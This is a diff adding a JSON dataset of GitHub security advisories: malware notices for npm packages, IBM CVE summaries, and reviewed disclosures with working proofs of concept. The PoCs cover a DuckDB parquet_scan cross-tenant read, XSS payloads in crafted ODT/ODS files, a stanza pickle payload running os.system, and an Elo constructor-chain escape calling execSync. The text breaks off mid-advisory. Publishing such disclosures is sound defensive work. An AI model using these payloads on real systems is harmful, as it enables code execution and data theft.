@@ -1,0 +1,1703 @@
+{
+  "retrievedAt": "2026-11-05T00:26:18.263190+00:00",
+  "source": "GitHub Advisory Database",
+  "license": "CC BY 4.0",
+  "licenseUrl": "https://creativecommons.org/licenses/by/4.0/",
+  "collection": "https://api.github.com/advisories",
+  "scope": "Latest 8 reviewed, 4 unreviewed and 4 malware records fetched for the demo; not complete historical coverage.",
+  "items": [
+    {
+      "id": "GHSA-4rp3-383p-p8qj",
+      "cve": null,
+      "title": "Malware in @secauditb20y/sec-test-b1",
+      "description": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "url": "https://github.com/advisories/GHSA-4rp3-383p-p8qj",
+      "severity": "critical",
+      "type": "malware",
+      "published": "2026-11-04T22:54:20Z",
+      "updated": "2026-11-04T22:54:30Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": [
+        {
+          "package": "@secauditb20y/sec-test-b1",
+          "ecosystem": "npm",
+          "range": ">= 0",
+          "patched": null
+        }
+      ]
+    },
+    {
+      "id": "GHSA-pgq7-5652-37p2",
+      "cve": null,
+      "title": "Malware in @secaudita10x/sec-test-a1",
+      "description": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "url": "https://github.com/advisories/GHSA-pgq7-5652-37p2",
+      "severity": "critical",
+      "type": "malware",
+      "published": "2026-11-04T22:54:19Z",
+      "updated": "2026-11-04T22:54:20Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": [
+        {
+          "package": "@secaudita10x/sec-test-a1",
+          "ecosystem": "npm",
+          "range": ">= 0",
+          "patched": null
+        }
+      ]
+    },
+    {
+      "id": "GHSA-h95w-3ffr-98m2",
+      "cve": null,
+      "title": "Malware in @secauditb20y/sec-test-r3b",
+      "description": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "url": "https://github.com/advisories/GHSA-h95w-3ffr-98m2",
+      "severity": "critical",
+      "type": "malware",
+      "published": "2026-11-04T22:54:19Z",
+      "updated": "2026-11-04T22:54:20Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": [
+        {
+          "package": "@secauditb20y/sec-test-r3b",
+          "ecosystem": "npm",
+          "range": ">= 0",
+          "patched": null
+        }
+      ]
+    },
+    {
+      "id": "GHSA-32p4-hf5c-v228",
+      "cve": null,
+      "title": "Malware in exnesss",
+      "description": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "url": "https://github.com/advisories/GHSA-32p4-hf5c-v228",
+      "severity": "critical",
+      "type": "malware",
+      "published": "2026-11-04T22:44:38Z",
+      "updated": "2026-11-04T22:44:39Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": [
+        {
+          "package": "exnesss",
+          "ecosystem": "npm",
+          "range": ">= 0",
+          "patched": null
+        }
+      ]
+    },
+    {
+      "id": "GHSA-hqvq-ppqp-2g54",
+      "cve": "CVE-2026-14252",
+      "title": "IBM MQ 9.2.0.0 through 9.2.0.44 LTS, 9.3.0.0 through 9.3.0.42 LTS, 9.4.0.0 through 9.4.0.26 LTS,...",
+      "description": "IBM MQ 9.2.0.0 through 9.2.0.44 LTS, 9.3.0.0 through 9.3.0.42 LTS, 9.4.0.0 through 9.4.0.26 LTS, 9.4.0.0 through 9.4.5.1 CD, and 10.0.0.0 through 10.0.0.5 LTS and CD stores potentially sensitive information in log files that could be read by a local user.",
+      "url": "https://github.com/advisories/GHSA-hqvq-ppqp-2g54",
+      "severity": "medium",
+      "type": "unreviewed",
+      "published": "2026-11-04T21:32:34Z",
+      "updated": "2026-11-04T21:32:45Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": []
+    },
+    {
+      "id": "GHSA-7339-96j2-5pg2",
+      "cve": "CVE-2026-82418",
+      "title": "IBM Watson Speech Services Cartridge 4.0.0 through 5.4.0 could allow a remote attacker to execute...",
+      "description": "IBM Watson Speech Services Cartridge 4.0.0 through 5.4.0 could allow a remote attacker to execute arbitrary code due to a use-after-free vulnerability.",
+      "url": "https://github.com/advisories/GHSA-7339-96j2-5pg2",
+      "severity": "critical",
+      "type": "unreviewed",
+      "published": "2026-11-04T21:32:33Z",
+      "updated": "2026-11-04T21:32:45Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": []
+    },
+    {
+      "id": "GHSA-9565-h7v7-796m",
+      "cve": "CVE-2026-19319",
+      "title": "IBM Watson Speech Services Cartridge 4.0.0 through 5.4.0 could allow a remote attacker to obtain...",
+      "description": "IBM Watson Speech Services Cartridge 4.0.0 through 5.4.0 could allow a remote attacker to obtain sensitive information due to an out-of-bounds read.",
+      "url": "https://github.com/advisories/GHSA-9565-h7v7-796m",
+      "severity": "medium",
+      "type": "unreviewed",
+      "published": "2026-11-04T21:32:33Z",
+      "updated": "2026-11-04T21:32:45Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": []
+    },
+    {
+      "id": "GHSA-r753-3wvx-h49q",
+      "cve": "CVE-2026-17493",
+      "title": "IBM Watson Speech Services Cartridge 4.0.0 through 5.4.0 could allow a remote attacker to cause a...",
+      "description": "IBM Watson Speech Services Cartridge 4.0.0 through 5.4.0 could allow a remote attacker to cause a denial of service due to an out-of-bounds read.",
+      "url": "https://github.com/advisories/GHSA-r753-3wvx-h49q",
+      "severity": "high",
+      "type": "unreviewed",
+      "published": "2026-11-04T21:32:33Z",
+      "updated": "2026-11-04T21:32:41Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": []
+    },
+    {
+      "id": "GHSA-93cm-2v4m-c56c",
+      "cve": "CVE-2026-55098",
+      "title": "Arc: DuckDB I/O aliases bypass database RBAC after CVE-2026-47735",
+      "description": "### Summary\n\nThe fix for CVE-2026-47735 (released 2026.06.1) is incomplete. It added a DuckDB sandbox (`SET GLOBAL allowed_directories=[<storage root>]; SET GLOBAL enable_external_access=false`) and an Arc SQL-layer denylist of the **literal** functions `read_parquet(` and `arc_partition_agg(`. The sandbox correctly blocks reads **outside** the storage root (OS files, `http://` SSRF), but it allowlists the **entire multi-tenant storage root**, and the SQL denylist still misses the rest of the DuckDB I/O family the original advisory enumerated. As a result, any authenticated token — including one with `permissions: []` — can read or enumerate **every other database's data** within the deployment, defeating RBAC.\n\nVerified at HEAD `c08b892` (`v26.06.1-36`, includes 26.06.2). Confirmed still live; no later commit blocks these functions.\n\n### Root cause (three composing gaps)\n\n1. **Sandbox scope is the whole storage root, not the tenant.** `internal/database/sandbox.go:111` allowlists `cfg.LocalStorageRoot` (default `storage.local_path=./data/arc`). Every database lives under it — `internal/storage/util.go:33` `GetStoragePath` => `<base>/<database>/<measurement>/**/*.parquet`. Any in-root path is sandbox-permitted regardless of which database owns it.\n2. **RBAC never inspects table-valued functions.** `checkQueryPermissions` (`internal/api/query.go:1181`) extracts table refs via `extractTableReferences`, which skips any name followed by `(` as a function (`internal/api/query.go:1116`); with zero refs it returns allow (`:1213-1216`). So `parquet_scan(...)`, `glob(...)`, `parquet_metadata(...)`, `read_blob(...)`, `read_csv_auto(...)` are never authorization-checked.\n3. **The SQL denylist matches only the literal spelling.** `userSQLReadParquetPattern` (`internal/api/query.go:2087`) is `\\bread_parquet\\s*\\(`. DuckDB's documented alias **`parquet_scan(`** is not matched, and `read_csv_auto`/`read_json`/`read_text`/`read_blob`/`glob`/`parquet_metadata`/`parquet_schema` are not blocked anywhere. The fix author documented this very threat at `internal/api/query.go:2061-2064` (“a user scoped to db1.m1 could read /data/db2/secrets/**/*.parquet”) but blocked only the literal `read_parquet(`.\n\n### Exploit (authenticated, any token incl. permissions:[])\n\n```\nPOST /api/v1/query\nAuthorization: Bearer <token>\nContent-Type: application/json\n{\"sql\": \"SELECT * FROM parquet_scan('./data/arc/<victim-db>/<measurement>/**/*.parquet')\"}\n```\n\n- `ValidateSQLRequest` passes (`parquet_scan(` is not `read_parquet(`, not a dangerous keyword, single statement).\n- `checkQueryPermissions` extracts 0 table refs (it is a function call) and allows.\n- `convertSQLToStoragePaths` finds no `read_parquet` literal and no bare `FROM measurement` to rewrite, so the query passes through unchanged.\n- DuckDB runs `parquet_scan('<root>/<victim-db>/...')`; the path is inside `allowed_directories`, so the other database's rows are returned.\n\n`glob('./data/arc/**/*')` enumerates every database/measurement/file; `parquet_metadata(...)`/`parquet_schema(...)` leak column names and per-column min/max value statistics; `read_blob(...)` returns raw file bytes. All operate within the allowlisted root.\n\n### Proof (poc/poc_sandbox_alias_bypass.py, poc/OUTPUT.txt)\n\nReproduces Arc's exact sandbox config (`allowed_directories=[<root>]`, `enable_external_access=false`) on DuckDB 1.5.x (Arc pins duckdb-go-bindings 1.5.1) with a victim parquet written under the root:\n\n```\n[BLOCKED ] read_blob OUTSIDE root            -> Permission Error: Cannot access file ...\n[EXECUTES] parquet_scan victim (read_parquet ALIAS) -> [('tenant-VICTIM-row', 42)]\n[EXECUTES] glob enumerate every db under root -> [('.../data/arc/victim-db/secrets/f.parquet',)]\n[EXECUTES] parquet_metadata victim           -> [('leaked','tenant-VICTIM-row','tenant-VICTIM-row'), ('v','42','42')]\n```\n\nThe sandbox blocks escape (as designed) but permits every in-root cross-database read.\n\n### Impact\n\nCross-database / cross-tenant confidential read by any authenticated principal, including a least-privileged (`permissions: []`) token, on RBAC-enabled deployments. This is the same RBAC-bypass impact the original advisory described for `read_parquet`, still reachable via the alias and the unblocked I/O family. (Arc's SQLite token DB `./data/arc.db` is a sibling of `./data/arc/` and is **not** in the allowlist, so it is not readable this way — the exposure is the time-series data of every database, plus its schema and value-range statistics.)\n\n### Remediation\n\nPer-request scope the sandbox to the requesting token's authorized database path(s): `allowed_directories = ['<base>/<authorized-db>/']`, so the file layer cannot cross the RBAC boundary regardless of which function is used. Alternatively, replace the function-name denylist with a strict allowlist of permitted table functions (alias-resolved, reject all others). A denylist of literal spellings is structurally fragile — this is the second alias/family miss after the original audit.",
+      "url": "https://github.com/advisories/GHSA-93cm-2v4m-c56c",
+      "severity": "medium",
+      "type": "reviewed",
+      "published": "2026-11-04T17:02:37Z",
+      "updated": "2026-11-04T17:02:38Z",
+      "withdrawn": null,
+      "credits": [
+        {
+          "name": "anir0y",
+          "type": "reporter"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "package": "github.com/basekick-labs/arc",
+          "ecosystem": "go",
+          "range": "< 0.0.0-20260610131716-5dc8f53b70a3",
+          "patched": "0.0.0-20260610131716-5dc8f53b70a3"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mc8m-rr6c-r5qr",
+      "cve": "CVE-2026-93363",
+      "title": "@payloadcms/storage-vercel-blob has access control bypass of uploads in Vercel Storage adapter",
+      "description": "### Impact\nIn affected configurations, client upload access does not consistently align with the associated collection’s access configuration.\n\nYou are affected if:\n- You use client uploads with `@payloadcms/storage-vercel-blob`.\n- Authenticated users can access the client-upload route.\n\nApplications that do not enable client uploads are not affected.\n\n### Patches\nClient uploads now require authentication and the appropriate collection-level access before upload access is granted.\n\nUsers should upgrade Payload packages to `>= 3.90.0` or `>= 4.0.0-canary.34`.\n\n### Workarounds\nUpgrading to a patched version is recommended. Until you can upgrade, disable client uploads or configure the upload route’s access control to enforce the associated collection’s permissions.",
+      "url": "https://github.com/advisories/GHSA-mc8m-rr6c-r5qr",
+      "severity": "medium",
+      "type": "reviewed",
+      "published": "2026-11-04T17:00:39Z",
+      "updated": "2026-11-04T17:00:40Z",
+      "withdrawn": null,
+      "credits": [
+        {
+          "name": "wsparks-vc",
+          "type": "reporter"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "package": "@payloadcms/storage-vercel-blob",
+          "ecosystem": "npm",
+          "range": ">= 3.25.0, < 3.90.0",
+          "patched": "3.90.0"
+        },
+        {
+          "package": "@payloadcms/storage-vercel-blob",
+          "ecosystem": "npm",
+          "range": ">= 4.0.0-canary.0, < 4.0.0-canary.34",
+          "patched": "4.0.0-canary.34"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3cgg-c5pp-57h6",
+      "cve": "CVE-2026-113787",
+      "title": "odf-kit: HTML injection leading to XSS in odtToHtml() and odsToHtml() via unescaped style attribute values",
+      "description": "### Summary\n\nODF style attribute values are interpolated into `style=\"...\"` attributes without HTML-escaping in **both** of odf-kit's to-HTML renderers (`odtToHtml` and `odsToHtml`). A double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary HTML/attribute injection — and therefore script execution (XSS) — from a crafted `.odt` or `.ods` file wherever the rendered output is inserted as HTML, which is the documented purpose of both functions.\n\n### Details\n\n#### ODT renderer (`src/odt/to-html/html-renderer.ts`)\n\nThe renderer has an `escapeHtml()` helper and applies it consistently to text content and to attribute values — `href`, `src`, `alt`, `id`, `data-author`, `data-date`, citation text all go through it. The inline CSS strings do not.\n\nIn `renderTextSpan` (dist/odt/to-html/html-renderer.js:195):\n\n```js\nconst css = spanStyleToCss(span.style);\nif (css)\n    html = `<span style=\"${css}\">${html}</span>`;\n```\n\nThe value of e.g. `fo:color` is copied from the document into `style.fontColor` verbatim by the parser (`extractSpanStyle`, read/parser.js:348), then concatenated raw into the attribute. A `\"` in the value terminates the attribute early.\n\nThe same unescaped `style=\"${...}\"` pattern appears at roughly ten other emission sites: paragraph and heading (`paragraphStyleToCss`), table cells and rows (`cellStyleToCss`, `rowStyleToCss`), `<col>`, and the image style attribute. The affected source attributes include `fo:color`, `fo:background-color`, `fo:text-shadow`, `fo:letter-spacing`, `fo:font-family` (via both direct and font-face resolution), `fo:margin-*`, `fo:padding-*`, `fo:line-height`, `fo:border*`, and `style:vertical-align`.\n\n#### ODS renderer (`src/ods/to-html/html-renderer.ts`) — same bug\n\n`buildInlineStyle()` assembles the CSS string from cell formatting properties — `fo:color`, `fo:font-size`, `fo:font-family`, `fo:background-color`, `fo:text-align`, etc. — with zero `escapeHtml` calls, and `renderCell` emits it raw (line 65):\n\n```ts\nif (includeStyles && cell.formatting) {\n    const style = buildInlineStyle(cell.formatting);\n    if (style) attrs.push(`style=\"${style}\"`);\n}\n```\n\nAdditionally, `row.height` (from `style:row-height`) goes raw into the row element (line 95):\n\n```ts\nconst style = includeStyles && row.height ? ` style=\"height:${row.height}\"` : \"\";\nreturn `<tr class=\"${prefix}-row\"${style}>${cells}</tr>`;\n```\n\nThe same injection is reachable through the public `odf-kit/ods/to-html` export (`odsToHtml()`), so both to-HTML directions are affected.\n\n#### Version scope\n\nThe `odt/to-html` and `ods/to-html` modules first shipped in **0.14.0**; the current latest release is **0.14.1**. The PoCs were re-ran against the unreleased `main` branch (commit `270a361`) — both injections still fire, so no fix has landed past the release.\n\n### PoC\n\nEach PoC is a minimal ODF package (`mimetype` + `META-INF/manifest.xml` + `content.xml`) whose `content.xml` contains exactly one poisoned automatic style. The files are generated by this short Python script (stdlib only, no dependencies) — save as `build-pocs.py` and run `python3 build-pocs.py`:\n\n```python\nimport zipfile\n\ndef build(path, mimetype, content):\n    # ODF requires 'mimetype' first and stored uncompressed\n    with zipfile.ZipFile(path, \"w\") as z:\n        z.writestr(zipfile.ZipInfo(\"mimetype\"), mimetype, compress_type=zipfile.ZIP_STORED)\n        z.writestr(\"META-INF/manifest.xml\",\n            '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n'\n            '<manifest:manifest xmlns:manifest=\"urn:oasis:names:tc:opendocument:xmlns:manifest:1.0\" manifest:version=\"1.2\">\\n'\n            ' <manifest:file-entry manifest:full-path=\"/\" manifest:media-type=\"' + mimetype + '\"/>\\n'\n            ' <manifest:file-entry manifest:full-path=\"content.xml\" manifest:media-type=\"text/xml\"/>\\n'\n            '</manifest:manifest>\\n')\n        z.writestr(\"content.xml\", content)\n\nODT = \"application/vnd.oasis.opendocument.text\"\nODS = \"application/vnd.oasis.opendocument.spreadsheet\"\nHEAD = ('<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n'\n        '<office:document-content\\n'\n        ' xmlns:office=\"urn:oasis:names:tc:opendocument:xmlns:office:1.0\"\\n'\n        ' xmlns:text=\"urn:oasis:names:tc:opendocument:xmlns:text:1.0\"\\n'\n        ' xmlns:style=\"urn:oasis:names:tc:opendocument:xmlns:style:1.0\"\\n'\n        ' xmlns:fo=\"urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0\">')\n\nQ = \"&quot;\"\np1 = f\"red{Q} onmouseover={Q}alert(1){Q} x={Q}\"                       # attribute injection\np2 = f'red{Q}&gt;&lt;img src=x onerror={Q}alert(1){Q}&gt;&lt;x style={Q}'  # full markup injection\n\n# .odt: one paragraph with a poisoned automatic text style\ndef odt(p):\n    return (HEAD + '\\n<office:automatic-styles>\\n'\n        ' <style:style style:family=\"paragraph\" style:name=\"P1\">\\n'\n        f'  <style:text-properties fo:color=\"{p}\"/>\\n'\n        ' </style:style>\\n</office:automatic-styles>\\n'\n        '<office:body><office:text><text:p text:style-name=\"P1\">hello</text:p>'\n        '</office:text></office:body></office:document-content>\\n')\n\n# .ods: one cell with a poisoned automatic cell style\ndef ods(p):\n    return (HEAD + '\\n<office:automatic-styles>\\n'\n        ' <style:style style:family=\"table-cell\" style:name=\"ce1\">\\n'\n        f'  <style:text-properties fo:color=\"{p}\"/>\\n'\n        ' </style:style>\\n</office:automatic-styles>\\n'\n        '<office:body><office:spreadsheet><table:table table:name=\"Sheet1\"'\n        ' xmlns:table=\"urn:oasis:names:tc:opendocument:xmlns:table:1.0\">'\n        '<table:table-row><table:table-cell table:style-name=\"ce1\" office:value-type=\"string\">'\n        '<text:p>hello</text:p></table:table-cell></table:table-row>'\n        '</table:table></office:spreadsheet></office:body></office:document-content>\\n')\n\nbuild(\"poc1.odt\", ODT, odt(p1))\nbuild(\"poc2.odt\", ODT, odt(p2))\nbuild(\"poc3.ods\", ODS, ods(p2))\n```\n\nThis produces `poc1.odt`, `poc2.odt` and `poc3.ods`. The only attacker-controlled input is the `fo:color` value on the style — for poc1 it reads, as stored in `content.xml`:\n\n```xml\n<style:text-properties fo:color=\"red&quot; onmouseover=&quot;alert(1)&quot; x=&quot;\"/>\n```\n\n\n**poc1.odt — attribute injection (ODT).** The `fo:color` value (unescaped) is:\n\n```\nred\" onmouseover=\"alert(1)\" x=\"\n```\n\n(encoded as `&quot;` in the XML). Output of `odtToHtml(bytes, { fragment: true })`:\n\n```html\n<p><span style=\"color:red\" onmouseover=\"alert(1)\" x=\"\">hello</span></p>\n```\n\nThe quote breaks out of `style`, and `onmouseover` becomes a real attribute on the span.\n\n**poc2.odt — full markup injection (ODT).** The style value is:\n\n```\nred\"><img src=x onerror=\"alert(1)\"><x style=\"\n```\n\nOutput:\n\n```html\n<p><span style=\"color:red\"><img src=x onerror=\"alert(1)\"><x style=\"\">hello</span></p>\n```\n\n**poc3.ods — same injection via the ODS renderer.** A crafted `.ods` whose cell automatic style carries a poisoned `fo:color` value (same payload as poc2). Output of `odsToHtml(bytes)`:\n\n```html\n<tr class=\"ods-row\"><td class=\"ods-cell\" style=\"color:red\"><img src=x onerror=\"alert(1)\"><x style=\"\">hello</td></tr>\n```\n\nReproduction script:\n\n```js\nimport { readFileSync } from 'fs';\nimport { odtToHtml } from 'odf-kit/odt/to-html';\nimport { odsToHtml } from 'odf-kit/ods/to-html';\n\nconst bytes = (p) => new Uint8Array(readFileSync(p));\n\nconsole.log(odtToHtml(bytes('poc2.odt'), { fragment: true }));\nconsole.log(odsToHtml(bytes('poc3.ods')));\n```\n\nThis was found while auditing ODT import paths in a web application that uses odf-kit as its converter. That application happens to sanitize the output downstream, so minimal standalone reproductions were built against the published odf-kit 0.14.1 package directly in Node.\n\n### Impact\n\nAny consumer that renders `odtToHtml()` or `odsToHtml()` output as HTML — which is both functions' documented purpose — gets XSS from a crafted `.odt`/`.ods` file they convert. Untrusted file → arbitrary tags and attributes → script execution in the host page with the page's origin. The fragment mode (`{ fragment: true }`) is equally affected. The header comment in the ODT renderer currently promises \"the output is safe to embed in any context\", so consumers may reasonably be relying on that today.\n\nFor what it's worth, the sibling paths were checked: the markdown direction does not reach this code, and `escapeHtml` is correctly applied everywhere else I looked in the ODT renderer. The ODS renderer initially appeared clean too, but the `buildInlineStyle` path above is the second instance of the same defect.\n\n### Suggested fix\n\nEscape the assembled CSS string at every `style=\"${...}\"` site, in both renderers:\n\n```js\nhtml = `<span style=\"${escapeHtml(css)}\">${html}</span>`\n```\n\n(or, stronger, validate/allowlist the parsed style values at parse time — they are all supposed to be color literals, lengths, or keywords, so a strict per-property format check would also work; escaping `row.height` in the ODS renderer at line 95 as well). The per-site escape is the minimal fix consistent with the rest of the ODT file.",
+      "url": "https://github.com/advisories/GHSA-3cgg-c5pp-57h6",
+      "severity": "medium",
+      "type": "reviewed",
+      "published": "2026-11-04T16:14:34Z",
+      "updated": "2026-11-04T16:14:35Z",
+      "withdrawn": null,
+      "credits": [
+        {
+          "name": "PethuKannan",
+          "type": "reporter"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "package": "odf-kit",
+          "ecosystem": "npm",
+          "range": ">= 0.6.0, < 0.14.2",
+          "patched": "0.14.2"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-gh9r-c94j-cmp5",
+      "cve": "CVE-2026-115878",
+      "title": "Stanza: RCE via pickle deserialization in the lemmatizer",
+      "description": "## TL;DR\n\nLoading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `Trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. Result: `weights_only=True` gives no protection here, and model loading executes code.\n\nConfirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload `__reduce__` returns `(os.system, (cmd,))` ran the command at load time (marker file showed `uid=501(...)`, `executed_by=...`).\n\nA downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. `stanza.Pipeline(lang=..., processors=\"tokenize,pos,lemma\", lemma_model_path=\"<attacker-influenced .pt>\")` (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into `Trainer.load` -> `_unpack_pos_dict` and executes the embedded pickle at construction time.\n\n## The vulnerable path\n\n`stanza/models/lemma/trainer.py`:\n\n```python\n# _pack_pos_dict (write side): pos_dict -> pickle -> gzip -> bytes, stored under checkpoint['dicts']\n\ndef _unpack_pos_dict(data):                 # line 54\n    buf = io.BytesIO(data)\n    with gzip.GzipFile(fileobj=buf, mode=\"rb\") as gz:\n        raw = gz.read()\n    return pickle.loads(raw)                # <-- unrestricted default unpickler\n```\n\n```python\ndef load(self, filename, ...):              # line 365\n    checkpoint = torch.load(filename, ..., weights_only=True)   # outer allowlist; bytes pass through intact\n    ...\n    if dicts_version == _DICTS_VERSION_POS:                     # dicts_version == 2 (current format)\n        self.pos_dict = _unpack_pos_dict(checkpoint['dicts'])   # line 378, no validation\n```\n\n**Reachable from the documented API.** `stanza.Pipeline(..., lemma_model_path=<file>)` -> `LemmaProcessor._set_up_model` -> `Trainer(model_file=…)` -> `Trainer.load`. Any shared/distributed checkpoint, custom registry, or caller-supplied `lemma_model_path` reaches it. No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.\n\nNote: this is **not** the `weights_only=False` fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.\n\n## Minimal PoC\n\n```python\nimport gzip, io, os, pickle, tempfile, torch\nfrom stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS\n\nMARKER = os.path.join(tempfile.gettempdir(), \"stanza_lemma_poc_pwned\")\n\nclass Payload:\n    def __reduce__(self):\n        return (os.system, (\"id > %s 2>&1; echo executed_by=$(whoami) >> %s\" % (MARKER, MARKER),))\n\nbuf = io.BytesIO()\nwith gzip.GzipFile(fileobj=buf, mode=\"wb\") as gz:        # same shape as _pack_pos_dict()\n    gz.write(pickle.dumps(Payload(), protocol=4))\n\nckpt = {\"dicts\": buf.getvalue(), \"dicts_version\": _DICTS_VERSION_POS}\npt = os.path.join(tempfile.gettempdir(), \"evil_lemma.pt\")\ntorch.save(ckpt, pt, _use_new_zipfile_serialization=False)\n\nloaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact\n_unpack_pos_dict(loaded[\"dicts\"])                            # == trainer.py:378 -> command runs\nprint(\"pwned:\", open(MARKER).read().strip())\n```\n\nThe PoC calls `_unpack_pos_dict` directly: the exact expression at `trainer.py:378`. Reaching it through `stanza.Pipeline(...)` additionally requires the crafted file to carry a well-formed `config`/`vocab` so `load` runs to line 378 (established by source review); the deserialization to execution step is confirmed at runtime.\n\n## Fix\n\nDeserialize the inner stream with the `RestrictedUnpickler` the project already uses in `stanza/models/common/doc.py` (allowlists `tuple`/`list`/`dict` only):\n\n```python\nfrom stanza.models.common.doc import RestrictedUnpickler\n\ndef _unpack_pos_dict(data):\n    buf = io.BytesIO(data)\n    with gzip.GzipFile(fileobj=buf, mode=\"rb\") as gz:\n        raw = gz.read()\n    return RestrictedUnpickler(io.BytesIO(raw)).load()\n```\n\nA legitimate `pos_dict` is a nested `{pos: {word: lemma}}` string mapping no class/function globals, so it loads cleanly, while any `os.system`-style payload is rejected by `find_class`. JSON would work equally well (all keys/values are strings) and remove pickle from this path entirely. Apply to both `_unpack_pos_dict` and, for forward compatibility, `_pack_pos_dict`.",
+      "url": "https://github.com/advisories/GHSA-gh9r-c94j-cmp5",
+      "severity": "high",
+      "type": "reviewed",
+      "published": "2026-11-03T20:29:16Z",
+      "updated": "2026-11-03T20:29:16Z",
+      "withdrawn": null,
+      "credits": [
+        {
+          "name": "lexdotdev",
+          "type": "reporter"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "package": "stanza",
+          "ecosystem": "pip",
+          "range": "= 1.14.0",
+          "patched": "1.15.0"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-33r5-xmm8-v6x5",
+      "cve": "CVE-2026-44267",
+      "title": "Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access",
+      "description": "### Summary\n\nAn unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host JavaScript runtime. A payload built from the `.constructor.constructor` chain compiles, without modification, to a live `Function` invocation in the emitted JavaScript, escaping any sandbox assumption around \"Elo is a safe data/DSL language.\"\n\n### Vulnerable sink and root cause\n\nThree interacting sites in `src/` produce the bug at commit `749af7b`:\n\n1. **`src/transform.ts:144–158`** — the `member_access` handler allows access on types `any`, `object`, or `array` without filtering the property name. This is the only place an integrator could have plugged a denylist.\n2. **`src/compilers/javascript.ts:210`** — the JS emitter writes `${objectExpr}.${ir.property}` verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript.\n3. **`src/parser.ts:163–170, 748–750`** — the parser accepts `constructor` (and other JS meta-property names) as an ordinary identifier, so `.constructor` clears type-checking without triggering any warning.\n\nCombined, the Elo expression `({}).constructor.constructor('…')()` compiles to a live `Function('…')()` call in the emitted JS, executing in the realm of whichever sink runs the compiled code.\n\n### Attack surfaces\n\nAll three surfaces share the same root cause (no denylist in `transform.ts`) and are addressed by the same one-file patch:\n\n| # | Entry point | Threat model |\n|---|---|---|\n| 1 | Browser playground — `https://elo-lang.org/try/?code=…&run=1` | **0-click XSS / account takeover** against elo-lang.org. `?run=1` triggers `setTimeout(() => this.run(), 100)` in `playground_controller.ts:531`; the server issues a 301 that preserves `?code=`. Any shared URL that contains a payload compromises the visitor's session on elo-lang.org. |\n| 2 | `bin/elo` CLI | **RCE on CI / DevOps hosts.** Both `node bin/elo payload.elo` and `node bin/elo -e \"_\" -d @payload.elo -f elo` fire. The `-f elo` path is especially severe: the flag exists to pass user-supplied files as *data* into an Elo pipeline. No integrator expects a data-format flag to shell out to `/usr/bin/id`. |\n| 3 | Library API — `defaultFormats.elo.parse()` | **Node.js RCE for any downstream integrator** using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases). |\n\n### Proof of Concept\n\n**Common payload (works on all three entry points):**\n\n```elo\n({}).constructor.constructor('return this.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()')()\n```\n\n**Library API** — `poc-minimal.js`:\n\n```js\n// npm install elo\nconst { defaultFormats } = require('elo');\n\nconst payload = \"({}).constructor.constructor('return this.constructor.constructor(\\\\'return process\\\\')().mainModule.require(\\\\'child_process\\\\').execSync(\\\\'id\\\\').toString()')()\";\n\nconsole.log(defaultFormats.elo.parse(payload));\n// → uid=1000(ultrasupara) gid=1000(ultrasupara) groups=…\n```\n\n**CLI** — `poc-cli.sh`:\n\n```sh\nnode bin/elo payload.elo\n# uid=1000(ultrasupara)…\n\nnode bin/elo -e \"_\" -d @payload.elo -f elo\n# uid=1000(ultrasupara)…\n```\n\n**Browser playground** — 0-click XSS 